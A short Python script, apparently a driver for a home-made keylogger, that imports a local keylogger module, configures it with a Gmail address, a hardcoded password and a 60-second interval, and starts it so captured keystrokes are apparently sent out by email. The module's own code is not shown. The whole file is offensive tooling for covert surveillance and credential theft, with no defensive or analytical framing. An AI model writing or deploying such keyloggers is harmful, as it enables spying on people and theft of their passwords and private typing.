#!/usr/bin/env python
import keylogger

# don't know why pycharm is being weird with the module import
my_keylogger = keylogger.Keylogger("hacker.test.email333@gmail.com", "Hacker333", 60)
my_keylogger.start()


